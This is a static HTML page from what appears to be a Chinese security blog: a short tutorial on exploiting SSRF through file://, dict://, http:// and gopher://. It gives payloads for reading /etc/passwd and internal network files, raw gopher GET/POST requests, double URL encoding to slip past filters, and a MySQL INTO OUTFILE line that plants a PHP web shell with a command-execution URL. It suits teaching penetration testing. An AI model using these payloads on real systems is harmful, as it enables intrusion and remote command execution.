@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>常见协议与 SSRF 利用</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@常见协议与 SSRF 利用 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/ssrf/ssrf1/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="常见协议与 SSRF 利用" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/ssrf/ssrf1/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-05-09T15:40:00+08:00" />
+<meta property="article:modified_time" content="2024-05-09T15:40:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="常见协议与 SSRF 利用"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "SSRF服务端请求伪造",
+      "item": "http://118.178.86.67/list/base_bug/ssrf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "常见协议与 SSRF 利用",
+      "item": "http://118.178.86.67/list/base_bug/ssrf/ssrf1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "常见协议与 SSRF 利用",
+  "name": "常见协议与 SSRF 利用",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "概述 下面把你提供的片段整理为 Hugo 可用的 Markdown 格式（包含前置元数据），保持原始示例与命令/报文不变，便于直接复制到 content/ 下作为教程页面。\nfile:// 协议 可以通过以下路径检查或读取目标可访问的本地文件：\nfile:///etc/passwd # 检查是否能读取 /etc/passwd file:///etc/hosts # 查看本机 hosts，用于推断内网映射与网段信息 file:///proc/net/arp # 查看本机 ARP 记录，了解局域网活动主机 注意：现代浏览器或服务一般会限制 file:// 访问，但在某些服务端 SSRF 场景下仍可能被利用。\ndict:// dict://ip:port/info 用途：部分服务或自定义实现可能暴露 dict 协议接口，可用于探测服务信息或扫描特定 ID，结果依赖目标实现而异。\nhttp:// http:// 用途：最常见的 SSRF 载体，用于扫描内网主机、读取主机上可访问的文件或内网 Web 服务。\ngopher:// # 说明 该伪协议默认端口为 70 传输数据时，部分实现会“吞掉”第一个字符 示例： gopher://ip:port/_XXX gopher 协议常用于在 SSRF 中构造原始 TCP 请求（可对数据库、Redis、SMTP 等服务直接发协议字节流）。 对于某些目标，需注意实现差异（如第一个字符被吃掉等问题）。 GET 传输 示例与注意事项 示例 payload：\nGET /name.php?name=666 HTTP/1.1 Host: 172.250.250.4 注意：\nHTTP 报文每行必须以 CRLF（\\r\\n）结尾，报文末尾需有额外空行表示头部结束。 URL 中的特殊字符必须做 URL 编码，例如： ? -\u003e %3F 换行 -\u003e %0D%0A 空格 -\u003e %20 或在数据框中对整个 URL 做一次“全编码”。 在 Burp Suite 等工具中修改数据包时，尝试对 payload 做两次 URL 编码以绕过某些过滤规则。 POST 传输 示例与注意事项 示例 payload：\nPOST /name.php HTTP/1.1 Host: 172.250.250.4 Content-Type: application/x-www-form-urlencoded Content-Length: 8 name=hzh 注意：\nContent-Length 必须精确等于请求体的字节长度。 POST 数据如含特殊字符，按需做 URL 编码；在某些场景为了绕过检测需要做两次 URL 编码。 推荐使用 Burp Repeater、netcat、socat 等工具调试原始报文的 CRLF 与长度问题。 gopher 协议与 SQL 注入的特殊点 使用 gopher 对 SQL 注入或数据库协议时，尽量避免空格、+ 等字符；应对这些字符进行 URL 编码（例如空格 -\u003e %20）。 手工分析时，可使用 tcpdump 抓包并用 Wireshark 查看握手与原始字节流，以确保 payload 格式正确。 工具：gopherus 可帮助生成 gopher payload，方便构造面向 TCP 的原始请求。 SSRF 针对 MySQL 的利用（未授权查询与文件写入） 手工抓取与分析 手工抓包：使用 tcpdump -w 保存原始握手包，用 Wireshark 分析并截取发送的原始指令数据。 生成 gopher payload 时可用脚本按规则（如每两个字节前加 %）编码，或直接用 gopherus 等工具生成。 未授权查询（思路） 通过 SSRF 将构造好的 MySQL 协议请求发送到目标 MySQL（默认端口 3306），尝试进行未授权查询（现代 MySQL 一般有认证，成功概率取决于配置/漏洞）。 未授权文件写入（示例 SQL） 当 secure_file_priv 未设置或为空时，MySQL 可能允许向可写路径写文件，可利用如下 SQL 将 web 后门写入：\nSELECT '\u003c?php system($_GET[\\\"smd\\\"]);?\u003e' INTO OUTFILE '/var/www/html/cmd.php'; 写入成功后，可访问 http://target/cmd.php?smd=whoami（视目标环境与权限而定）来触发命令执行。\n小结与安全建议 在构造原始报文（GET/POST）时，务必保证 CRLF 与 Content-Length 的准确性；复杂场景下尝试双重 URL 编码以绕过过滤。 gopher 是 SSRF 中强力的“原始 TCP”载体，但需注意协议实现差异（如字符丢失）与编码问题。 对 MySQL 等内部服务的未授权访问/写入依赖目标配置（如 secure_file_priv），在测试时应先抓包并确认交互格式。 ",
+  "wordCount" : "216",
+  "inLanguage": "en",
+  "datePublished": "2024-05-09T15:40:00+08:00",
+  "dateModified": "2024-05-09T15:40:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/ssrf/ssrf1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>常见协议与 SSRF 利用</h1>
+  </header>
+
+  <p>
+  <small>
+    May 9, 2024&nbsp;· 216 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概述">概述</a></li>
+    <li><a href="#file-协议">file:// 协议</a></li>
+    <li><a href="#dict">dict://</a></li>
+    <li><a href="#http">http://</a></li>
+    <li><a href="#gopher">gopher://</a></li>
+    <li><a href="#get-传输-示例与注意事项">GET 传输 示例与注意事项</a></li>
+    <li><a href="#post-传输-示例与注意事项">POST 传输 示例与注意事项</a></li>
+    <li><a href="#gopher-协议与-sql-注入的特殊点">gopher 协议与 SQL 注入的特殊点</a></li>
+    <li><a href="#ssrf-针对-mysql-的利用未授权查询与文件写入">SSRF 针对 MySQL 的利用（未授权查询与文件写入）</a>
+      <ul>
+        <li><a href="#手工抓取与分析">手工抓取与分析</a></li>
+        <li><a href="#未授权查询思路">未授权查询（思路）</a></li>
+        <li><a href="#未授权文件写入示例-sql">未授权文件写入（示例 SQL）</a></li>
+      </ul>
+    </li>
+    <li><a href="#小结与安全建议">小结与安全建议</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h2 id="概述">概述</h2>
+<p>下面把你提供的片段整理为 Hugo 可用的 Markdown 格式（包含前置元数据），保持原始示例与命令/报文不变，便于直接复制到 <code>content/</code> 下作为教程页面。</p>
+<hr>
+<h2 id="file-协议">file:// 协议</h2>
+<p>可以通过以下路径检查或读取目标可访问的本地文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>file:///etc/passwd      # 检查是否能读取 /etc/passwd
+</span></span><span style="display:flex;"><span>file:///etc/hosts       # 查看本机 hosts，用于推断内网映射与网段信息
+</span></span><span style="display:flex;"><span>file:///proc/net/arp    # 查看本机 ARP 记录，了解局域网活动主机
+</span></span></code></pre></div><blockquote>
+<p>注意：现代浏览器或服务一般会限制 <code>file://</code> 访问，但在某些服务端 SSRF 场景下仍可能被利用。</p>
+</blockquote>
+<hr>
+<h2 id="dict">dict://</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dict://ip:port/info
+</span></span></code></pre></div><p>用途：部分服务或自定义实现可能暴露 <code>dict</code> 协议接口，可用于探测服务信息或扫描特定 ID，结果依赖目标实现而异。</p>
+<hr>
+<h2 id="http">http://</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://
+</span></span></code></pre></div><p>用途：最常见的 SSRF 载体，用于扫描内网主机、读取主机上可访问的文件或内网 Web 服务。</p>
+<hr>
+<h2 id="gopher">gopher://</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># 说明
+</span></span><span style="display:flex;"><span>该伪协议默认端口为 70
+</span></span><span style="display:flex;"><span>传输数据时，部分实现会“吞掉”第一个字符
+</span></span><span style="display:flex;"><span>示例： gopher://ip:port/_XXX
+</span></span></code></pre></div><ul>
+<li><code>gopher</code> 协议常用于在 SSRF 中构造原始 TCP 请求（可对数据库、Redis、SMTP 等服务直接发协议字节流）。</li>
+<li>对于某些目标，需注意实现差异（如第一个字符被吃掉等问题）。</li>
+</ul>
+<hr>
+<h2 id="get-传输-示例与注意事项">GET 传输 示例与注意事项</h2>
+<p><strong>示例 payload：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /name.php?name=666 HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 172.250.250.4
+</span></span></code></pre></div><p><strong>注意：</strong></p>
+<ol>
+<li>HTTP 报文每行必须以 CRLF（<code>\r\n</code>）结尾，报文末尾需有额外空行表示头部结束。</li>
+<li>URL 中的特殊字符必须做 URL 编码，例如：
+<ul>
+<li><code>?</code> -&gt; <code>%3F</code></li>
+<li>换行 -&gt; <code>%0D%0A</code></li>
+<li>空格 -&gt; <code>%20</code>
+或在数据框中对整个 URL 做一次“全编码”。</li>
+</ul>
+</li>
+<li>在 Burp Suite 等工具中修改数据包时，尝试对 payload 做两次 URL 编码以绕过某些过滤规则。</li>
+</ol>
+<hr>
+<h2 id="post-传输-示例与注意事项">POST 传输 示例与注意事项</h2>
+<p><strong>示例 payload：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /name.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 172.250.250.4
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name=hzh
+</span></span></code></pre></div><p><strong>注意：</strong></p>
+<ul>
+<li><code>Content-Length</code> 必须精确等于请求体的字节长度。</li>
+<li>POST 数据如含特殊字符，按需做 URL 编码；在某些场景为了绕过检测需要做两次 URL 编码。</li>
+<li>推荐使用 Burp Repeater、netcat、socat 等工具调试原始报文的 CRLF 与长度问题。</li>
+</ul>
+<hr>
+<h2 id="gopher-协议与-sql-注入的特殊点">gopher 协议与 SQL 注入的特殊点</h2>
+<ul>
+<li>使用 <code>gopher</code> 对 SQL 注入或数据库协议时，尽量避免空格、<code>+</code> 等字符；应对这些字符进行 URL 编码（例如空格 -&gt; <code>%20</code>）。</li>
+<li>手工分析时，可使用 <code>tcpdump</code> 抓包并用 Wireshark 查看握手与原始字节流，以确保 payload 格式正确。</li>
+<li>工具：<code>gopherus</code> 可帮助生成 gopher payload，方便构造面向 TCP 的原始请求。</li>
+</ul>
+<hr>
+<h2 id="ssrf-针对-mysql-的利用未授权查询与文件写入">SSRF 针对 MySQL 的利用（未授权查询与文件写入）</h2>
+<h3 id="手工抓取与分析">手工抓取与分析</h3>
+<ul>
+<li>手工抓包：使用 <code>tcpdump -w</code> 保存原始握手包，用 Wireshark 分析并截取发送的原始指令数据。</li>
+<li>生成 gopher payload 时可用脚本按规则（如每两个字节前加 <code>%</code>）编码，或直接用 <code>gopherus</code> 等工具生成。</li>
+</ul>
+<h3 id="未授权查询思路">未授权查询（思路）</h3>
+<ul>
+<li>通过 SSRF 将构造好的 MySQL 协议请求发送到目标 MySQL（默认端口 3306），尝试进行未授权查询（现代 MySQL 一般有认证，成功概率取决于配置/漏洞）。</li>
+</ul>
+<h3 id="未授权文件写入示例-sql">未授权文件写入（示例 SQL）</h3>
+<p>当 <code>secure_file_priv</code> 未设置或为空时，MySQL 可能允许向可写路径写文件，可利用如下 SQL 将 web 后门写入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SELECT &#39;&lt;?php system($_GET[\&#34;smd\&#34;]);?&gt;&#39; INTO OUTFILE &#39;/var/www/html/cmd.php&#39;;
+</span></span></code></pre></div><p>写入成功后，可访问 <code>http://target/cmd.php?smd=whoami</code>（视目标环境与权限而定）来触发命令执行。</p>
+<hr>
+<h2 id="小结与安全建议">小结与安全建议</h2>
+<ul>
+<li>在构造原始报文（GET/POST）时，务必保证 CRLF 与 <code>Content-Length</code> 的准确性；复杂场景下尝试双重 URL 编码以绕过过滤。</li>
+<li><code>gopher</code> 是 SSRF 中强力的“原始 TCP”载体，但需注意协议实现差异（如字符丢失）与编码问题。</li>
+<li>对 MySQL 等内部服务的未授权访问/写入依赖目标配置（如 <code>secure_file_priv</code>），在测试时应先抓包并确认交互格式。</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/app/app2/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>APP 抓包问题与证书/代理/模拟器防护与绕过</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/rce/rce2/"><span>LD_PRELOAD 绕过：原理与实战</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
